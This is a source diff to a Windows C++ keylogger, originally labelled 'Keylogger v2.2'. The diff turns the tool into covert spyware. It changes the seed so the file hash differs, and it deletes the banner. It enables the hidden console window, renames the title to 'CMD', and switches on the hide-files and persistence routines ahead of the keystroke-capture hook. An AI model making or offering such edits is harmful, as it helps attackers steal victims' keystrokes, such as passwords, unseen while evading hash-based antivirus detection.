@@ -6,7 +6,7 @@
 #include <csignal>
 
 // NOTE: Change the seed to change the file hash.
-std::string seed = "3301Kira";
+std::string seed = "somebodytolove";
 
 void HideWindow() {
 	HWND hWindow = GetConsoleWindow();
@@ -250,21 +250,13 @@ void CreateHookThread() {
 }
 
 int main() {
-	// HideWindow();
-	SetConsoleTitleA("Keylogger");
-	printf("#######################################################################\n");
-	printf("#                                                                     #\n");
-	printf("#                              Keylogger v2.2                         #\n");
-	printf("#                                   by Ivan Sincek                    #\n");
-	printf("#                                                                     #\n");
-	printf("# GitHub repository at github.com/ivan-sincek/keylogger.              #\n");
-	printf("# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.  #\n");
-	printf("#                                                                     #\n");
-	printf("#######################################################################\n");
+	HideWindow();
+	SetConsoleTitleA("CMD");
+	
 	if (SetFileNames()) {
 		LogTime();
-		// HideFiles();
-		// Persistence();
+		 HideFiles();
+		 Persistence();
 		CreateHookThread();
 	}
 	return 0;
